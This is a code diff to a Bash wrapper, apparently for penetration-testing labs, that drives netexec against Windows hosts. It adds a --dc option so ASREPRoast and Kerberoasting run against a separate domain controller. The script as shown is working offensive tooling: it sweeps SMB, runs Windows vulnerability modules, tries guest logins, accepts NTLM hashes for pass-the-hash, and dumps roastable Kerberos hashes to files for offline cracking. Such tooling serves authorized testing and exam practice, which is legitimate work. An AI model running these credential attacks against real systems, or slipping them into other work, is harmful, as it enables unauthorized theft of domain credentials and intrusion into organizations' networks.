@@ -17,6 +17,7 @@ usage() {
     echo -e "${GREY}       --vulns-only  : skip protocol sweep, run Windows vuln modules only"
     echo -e "${GREY}       --no-guest    : skip the default SMB guest-account fallback"
     echo -e "${GREY}       --no-roast    : skip post-auth ASREPRoast / Kerberoasting (default: run when creds valid)"
+    echo -e "${GREY}       --dc <host>   : LDAP target for ASREPRoast/Kerberoasting (use when <IP> is not a DC)"
     echo -e "${GREY}       Hash/domain/KDC pass as global flags: -H <hash>, -d <domain>, --kdcHost <ip>"
     exit 1
 }
@@ -38,11 +39,13 @@ RUN_VULNS=1          # run Windows vuln modules on SMB by default
 VULNS_ONLY=0         # skip the protocol sweep, only run vuln modules
 RUN_GUEST=1          # also try the SMB guest account by default (null-session fallback)
 RUN_ROAST=1          # run ASREPRoast / Kerberoasting when credentials authenticate
+DC_TARGET=""         # optional LDAP target for roast (set with --dc)
 GLOBAL_FLAGS=()
 while [[ "$#" -gt 0 ]]; do
     case $1 in
         -u) USER=$2; shift 2 ;;
         -p) PASS=$2; shift 2 ;;
+        --dc) DC_TARGET=$2; shift 2 ;;
         --no-vulns) RUN_VULNS=0; shift 1 ;;
         --vulns-only) VULNS_ONLY=1; shift 1 ;;
         --no-guest) RUN_GUEST=0; shift 1 ;;
@@ -141,25 +144,19 @@ run_vulns() {
 }
 
 # --- Kerberos attacks (post-auth only) ---
-# ASREPRoast and Kerberoasting need valid AD credentials. nxc ldap only
-# dispatches --asreproast / --kerberoasting after a successful login, so a
-# plain nxc ldap call gates them for us (no fragile re-check needed).
-# The KDC name from the target's LDAP banner is often not resolvable in lab
-# DNS (e.g. "OSCP.EXAM:88 ... name or service not known"), so default
-# --kdcHost to the target when it speaks Kerberos (port 88) and no override
-# was supplied.
+# Kerberoasting / ASREPRoast require LDAP against a domain controller, which
+# may differ from the swept host. Target the DC directly (--dc), or fall back
+# to $TARGET. nxc ldap only dispatches --asreproast / --kerberoasting after a
+# successful login, so a plain nxc ldap call gates them for us.
 check_roast() {
     [[ "$RUN_ROAST" -eq 1 ]] || return
 
-    # no username => nothing to authenticate/roast with
     [[ -z "$USER" ]] && {
         echo -e "${GREY}[-] No username (-u). Skipping ASREPRoast/Kerberoasting."
         return
     }
     [[ "${USER,,}" == "guest" ]] && return
 
-    # pull -H / -d / --kdcHost out of the pass-through global flags so we can
-    # rebuild a clean ldap command without duplicating -p/-H.
     local HASH="" DOMAIN="" KDC_HOST=""
     local i g
     for ((i=0; i<${#GLOBAL_FLAGS[@]}; i++)); do
@@ -171,34 +168,40 @@ check_roast() {
         esac
     done
 
-    # need at least a password or an NTLM hash to authenticate
     if [[ -z "$PASS" && -z "$HASH" ]]; then
         echo -e "${GREY}[-] No password (-p) or hash (-H). Skipping ASREPRoast/Kerberoasting."
         return
     fi
 
-    if ! nc -z -w 1 "$TARGET" 389 2>/dev/null; then
-        echo -e "${GREY}[-] Port 389 closed/filtered. Skipping ASREPRoast/Kerberoasting"
+    # roast goes to the DC (or the swept host if it doubles as one)
+    local ROAST_TARGET="${DC_TARGET:-$TARGET}"
+
+    if ! nc -z -w 1 "$ROAST_TARGET" 389 2>/dev/null; then
+        if [[ -n "$DC_TARGET" ]]; then
+            echo -e "${GREY}[-] LDAP (389) closed on DC $ROAST_TARGET. Skipping ASREPRoast/Kerberoasting"
+        else
+            echo -e "${GREY}[-] LDAP (389) closed on $ROAST_TARGET. Skipping ASREPRoast/Kerberoasting (this box is not a DC; use --dc <dc-ip>)"
+        fi
         return
     fi
 
-    # target speaks Kerberos => it is the KDC for this box; use it to dodge
-    # unresolvable domain names unless the operator overrode --kdcHost.
-    if [[ -z "$KDC_HOST" ]] && nc -z -w 1 "$TARGET" 88 2>/dev/null; then
-        KDC_HOST="$TARGET"
+    # target speaks Kerberos => it is the KDC; use it to dodge unresolvable
+    # domain names (e.g. "OSCP.EXAM:88 ... name or service not known").
+    if [[ -z "$KDC_HOST" ]] && nc -z -w 1 "$ROAST_TARGET" 88 2>/dev/null; then
+        KDC_HOST="$ROAST_TARGET"
     fi
 
-    local SAFE="${TARGET//[^a-zA-Z0-9._-]/_}"
+    local SAFE="${ROAST_TARGET//[^a-zA-Z0-9._-]/_}"
     local ASREP="asreproast_${SAFE}.txt"
     local KERB="kerberoasting_${SAFE}.txt"
 
-    local CMD=(nxc ldap "$TARGET" -u "$USER")
+    local CMD=(nxc ldap "$ROAST_TARGET" -u "$USER")
     [[ -n "$HASH" ]] && CMD+=(-H "$HASH") || CMD+=(-p "$PASS")
     [[ -n "$DOMAIN" ]] && CMD+=(-d "$DOMAIN")
     [[ -n "$KDC_HOST" ]] && CMD+=(--kdcHost "$KDC_HOST")
     CMD+=(--asreproast "$ASREP" --kerberoasting "$KERB")
 
-    echo -e "${GREEN}[+] Authenticated as ${USER}. Running ASREPRoast + Kerberoasting ..."
+    echo -e "${GREEN}[+] LDAP on $ROAST_TARGET reachable. Running ASREPRoast + Kerberoasting ..."
     "${CMD[@]}"
 
     if [[ -s "$ASREP" ]]; then
